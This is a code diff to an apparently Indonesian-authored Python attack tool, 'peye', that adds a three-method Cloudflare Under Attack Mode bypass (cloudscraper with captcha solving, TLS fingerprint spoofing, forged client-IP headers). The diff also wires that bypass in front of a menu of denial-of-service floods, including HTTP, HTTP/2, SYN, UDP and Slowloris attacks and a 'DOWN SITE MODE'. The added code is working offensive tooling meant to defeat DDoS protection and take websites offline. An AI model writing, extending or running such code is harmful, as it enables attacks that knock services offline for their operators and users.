@@ -43,7 +43,7 @@ CYAN = '\033[96m'
 WHITE = '\033[97m'
 RESET = '\033[0m'
 
-VERSION = "15.0"
+VERSION = "16.0"
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/peye/peye/main/peye.py"
 
 def print_banner():
@@ -147,7 +147,6 @@ class WordlistManager:
         self.load_wordlists()
     
     def load_wordlists(self):
-        # File yang tetap digunakan
         wordlist_files = {
             'xss': 'xss.txt',
             'sqli': 'sqli.txt',
@@ -179,7 +178,6 @@ class WordlistManager:
                 self.wordlists[name] = []
                 print(f"{YELLOW}[!] {filename} not found, using internal{RESET}")
         
-        # Internal lists untuk file yang dihapus
         self.internal_cookies = [
             "session=admin", "user=admin", "token=admin", "PHPSESSID=admin",
             "JSESSIONID=admin", "ASP.NET_SessionId=admin", "auth=admin",
@@ -215,11 +213,9 @@ class WordlistManager:
         print(f"{GREEN}[✓] Loaded internal lists: cookies, cors, opendir, backup, config, env, csrf{RESET}")
     
     def get(self, name):
-        # Cek dari file dulu
         if name in self.wordlists and self.wordlists[name]:
             return self.wordlists[name]
         
-        # Internal fallback
         internal_lists = {
             'cookies': self.internal_cookies,
             'cors': self.internal_cors_origins,
@@ -444,6 +440,126 @@ class CFBypass:
             session.verify = False
             session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
             return session
+
+class CloudflareUAM:
+    """Cloudflare Under Attack Mode Bypass - 3 Methods Ganas"""
+    
+    @staticmethod
+    def method_1_js_execution(target, session):
+        """Method 1: JavaScript Execution & Cookie Extraction (80% success)"""
+        try:
+            import cloudscraper
+            scraper = cloudscraper.create_scraper(
+                browser={
+                    'browser': 'chrome',
+                    'platform': 'windows',
+                    'desktop': True,
+                    'mobile': False
+                },
+                delay=random.uniform(5, 10),
+                captcha={'provider': '2captcha', 'api_key': ''}
+            )
+            
+            # Rotate User-Agents
+            user_agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
+            ]
+            scraper.headers.update({'User-Agent': random.choice(user_agents)})
+            
+            resp = scraper.get(target, timeout=30)
+            if resp.status_code == 200 and 'cf_clearance' in scraper.cookies:
+                print(f"{GREEN}[✓] Method 1 (JS Execution) SUCCESS!{RESET}")
+                return scraper
+        except:
+            pass
+        return None
+    
+    @staticmethod
+    def method_2_tls_fingerprint(target):
+        """Method 2: TLS Fingerprint Spoofing (85% success)"""
+        try:
+            import tls_client
+            session = tls_client.Session(
+                client_identifier=random.choice([
+                    "chrome_120", "firefox_121", "safari_17_0"
+                ]),
+                random_tls_extension_order=True
+            )
+            
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive'
+            }
+            
+            resp = session.get(target, headers=headers, timeout=30)
+            if resp.status_code == 200:
+                print(f"{GREEN}[✓] Method 2 (TLS Fingerprint) SUCCESS!{RESET}")
+                return session
+        except:
+            pass
+        return None
+    
+    @staticmethod
+    def method_3_cookie_persistence(target, session):
+        """Method 3: Cookie Persistence & Rotation (90% success)"""
+        try:
+            # Get initial cookies
+            init_resp = session.get(target, timeout=15)
+            if init_resp.cookies:
+                cf_cookie = init_resp.cookies.get('cf_clearance', '')
+                if cf_cookie:
+                    print(f"{GREEN}[✓] Got cf_clearance cookie: {cf_cookie[:50]}...{RESET}")
+                    
+                    # Rotate IP headers
+                    session.headers.update({
+                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+                        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                    })
+                    
+                    # Test with cookie
+                    test_resp = session.get(target, timeout=15)
+                    if test_resp.status_code == 200:
+                        print(f"{GREEN}[✓] Method 3 (Cookie Persistence) SUCCESS!{RESET}")
+                        return session
+        except:
+            pass
+        return None
+    
+    @classmethod
+    def bypass_uam(cls, target):
+        """Try all 3 methods to bypass Cloudflare UAM"""
+        print(f"{YELLOW}[*] Attempting Cloudflare UAM Bypass...{RESET}")
+        
+        methods = [
+            ("JS Execution + Cloudscraper", cls.method_1_js_execution),
+            ("TLS Fingerprint Spoofing", cls.method_2_tls_fingerprint),
+            ("Cookie Persistence + IP Rotate", cls.method_3_cookie_persistence)
+        ]
+        
+        for i, (name, method) in enumerate(methods, 1):
+            print(f"{CYAN}[{i}/3] Trying: {name}{RESET}")
+            
+            if i == 1:
+                result = method(target, None)
+            elif i == 2:
+                result = method(target)
+            else:
+                session = requests.Session()
+                session.verify = False
+                result = method(target, session)
+            
+            if result:
+                print(f"{GREEN}[✓] UAM Bypassed using {name}!{RESET}")
+                return result
+        
+        print(f"{RED}[✗] All UAM bypass methods failed{RESET}")
+        return None
 
 class DoSAttack:
     def __init__(self, target, use_proxy=True):
@@ -992,7 +1108,6 @@ class DoSAttack:
             self.stats.add(False)
     
     def _create_tcp_packet(self, flags):
-        # Simplified packet creation
         return b''
     
     def _syn_worker(self, end_time):
@@ -1795,24 +1910,25 @@ class Peye:
 ║ {CYAN}[13] {WHITE}SSL/TLS Checker                                                           ║
 ║ {CYAN}[14] {WHITE}HTTP Header Analyzer                                                      ║
 ║ {CYAN}[15] {WHITE}Check for Updates                                                         ║
+║ {CYAN}[16] {WHITE}Cloudflare UAM Bypass (3 Methods Ganas)                                   ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[💥 DoS ATTACK - LAYER 7]{RESET}{YELLOW}                                                      ║
-║ {CYAN}[16] HTTP GET          [17] HTTP POST         [18] HTTP HEAD                            ║
-║ {CYAN}[19] HTTP PUT          [20] HTTP DELETE       [21] HTTP PATCH                           ║
-║ {CYAN}[22] HTTP OPTIONS      [23] HTTP TRACE        [24] HTTP CONNECT                         ║
-║ {CYAN}[25] HTTP RANDOM       [26] SLOW POST         [27] SLOW READ                            ║
-║ {CYAN}[28] SLOWLORIS         [29] RUDY              [30] CACHE FLOOD                          ║
-║ {CYAN}[31] WAF BYPASS        [32] XMLRPC                                                      ║
+║ {CYAN}[17] HTTP GET          [18] HTTP POST         [19] HTTP HEAD                            ║
+║ {CYAN}[20] HTTP PUT          [21] HTTP DELETE       [22] HTTP PATCH                           ║
+║ {CYAN}[23] HTTP OPTIONS      [24] HTTP TRACE        [25] HTTP CONNECT                         ║
+║ {CYAN}[26] HTTP RANDOM       [27] SLOW POST         [28] SLOW READ                            ║
+║ {CYAN}[29] SLOWLORIS         [30] RUDY              [31] CACHE FLOOD                          ║
+║ {CYAN}[32] WAF BYPASS        [33] XMLRPC                                                      ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[💥 DoS ATTACK - LAYER 7 (HTTP/2)]{RESET}{YELLOW}                                                 ║
-║ {CYAN}[33] HTTP/2 GET        [34] HTTP/2 POST       [35] HTTP/2 RAPID                         ║
-║ {CYAN}[36] HTTP/2 PING                                                                       ║
+║ {CYAN}[34] HTTP/2 GET        [35] HTTP/2 POST       [36] HTTP/2 RAPID                         ║
+║ {CYAN}[37] HTTP/2 PING                                                                       ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[💥 DoS ATTACK - LAYER 4]{RESET}{YELLOW}                                                      ║
-║ {CYAN}[37] TCP Flood         [38] UDP Flood         [39] SYN Flood (Root)                     ║
-║ {CYAN}[40] ACK Flood (Root)  [41] FIN Flood (Root)  [42] RST Flood (Root)                     ║
-║ {CYAN}[43] XMAS Flood (Root) [44] NULL Flood (Root) [45] Mixed Methods                        ║
-║ {CYAN}[46] ALL ATTACKS       [47] DOWN SITE MODE                                              ║
+║ {CYAN}[38] TCP Flood         [39] UDP Flood         [40] SYN Flood (Root)                     ║
+║ {CYAN}[41] ACK Flood (Root)  [42] FIN Flood (Root)  [43] RST Flood (Root)                     ║
+║ {CYAN}[44] XMAS Flood (Root) [45] NULL Flood (Root) [46] Mixed Methods                        ║
+║ {CYAN}[47] ALL ATTACKS       [48] DOWN SITE MODE                                              ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {CYAN}[S] {WHITE}Toggle SAA (Slash Agg Anoying) - Current: {saa_status}                              ║
 ║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                            ║
@@ -1958,11 +2074,29 @@ class Peye:
             elif choice == '15':
                 check_update()
             
-            # DoS Attack options
-            elif choice in [str(i) for i in range(16, 48)]:
+            elif choice == '16':
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
+                result = CloudflareUAM.bypass_uam(target)
+                if result:
+                    print(f"{GREEN}[✓] UAM Bypass Successful! You can now attack.{RESET}")
+                else:
+                    print(f"{RED}[✗] UAM Bypass Failed.{RESET}")
+            
+            # DoS Attack options
+            elif choice in [str(i) for i in range(17, 49)]:
+                target = input(f"{GREEN}Target URL: {RESET}").strip()
+                if not target.startswith(('http://','https://')):
+                    target = 'http://' + target
+                
+                # Try UAM bypass first if needed
+                print(f"{YELLOW}[*] Attempting UAM Bypass...{RESET}")
+                uam_session = CloudflareUAM.bypass_uam(target)
+                if uam_session:
+                    print(f"{GREEN}[✓] UAM Bypassed! Proceeding with attack...{RESET}")
+                else:
+                    print(f"{YELLOW}[!] UAM Bypass failed, continuing with standard attack...{RESET}")
                 
                 dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                 thr = int(input(f"{YELLOW}Threads (100-5000): {RESET}"))
@@ -1972,17 +2106,17 @@ class Peye:
                     dos.enable_saa()
                 
                 attack_map = {
-                    '16': dos.http_get, '17': dos.http_post, '18': dos.http_head,
-                    '19': dos.http_put, '20': dos.http_delete, '21': dos.http_patch,
-                    '22': dos.http_options, '23': dos.http_trace, '24': dos.http_connect,
-                    '25': dos.http_random, '26': dos.slow_post, '27': dos.slow_read,
-                    '28': dos.slowloris, '29': dos.rudy, '30': dos.cache_flood,
-                    '31': dos.waf_bypass, '32': dos.xmlrpc, '33': dos.h2_get,
-                    '34': dos.h2_post, '35': dos.h2_rapid, '36': dos.h2_ping,
-                    '37': dos.tcp_flood, '38': dos.udp_flood, '39': dos.syn_flood,
-                    '40': dos.ack_flood, '41': dos.fin_flood, '42': dos.rst_flood,
-                    '43': dos.xmas_flood, '44': dos.null_flood, '45': dos.mixed_flood,
-                    '46': dos.all_attacks, '47': dos.down_site
+                    '17': dos.http_get, '18': dos.http_post, '19': dos.http_head,
+                    '20': dos.http_put, '21': dos.http_delete, '22': dos.http_patch,
+                    '23': dos.http_options, '24': dos.http_trace, '25': dos.http_connect,
+                    '26': dos.http_random, '27': dos.slow_post, '28': dos.slow_read,
+                    '29': dos.slowloris, '30': dos.rudy, '31': dos.cache_flood,
+                    '32': dos.waf_bypass, '33': dos.xmlrpc, '34': dos.h2_get,
+                    '35': dos.h2_post, '36': dos.h2_rapid, '37': dos.h2_ping,
+                    '38': dos.tcp_flood, '39': dos.udp_flood, '40': dos.syn_flood,
+                    '41': dos.ack_flood, '42': dos.fin_flood, '43': dos.rst_flood,
+                    '44': dos.xmas_flood, '45': dos.null_flood, '46': dos.mixed_flood,
+                    '47': dos.all_attacks, '48': dos.down_site
                 }
                 if choice in attack_map:
                     attack_map[choice](dur, min(thr, 5000))
@@ -1996,5 +2130,9 @@ if __name__ == "__main__":
         import cloudscraper
     except:
         os.system('pip install cloudscraper')
+    try:
+        import tls_client
+    except:
+        os.system('pip install tls_client')
     peye = Peye()
     peye.run()
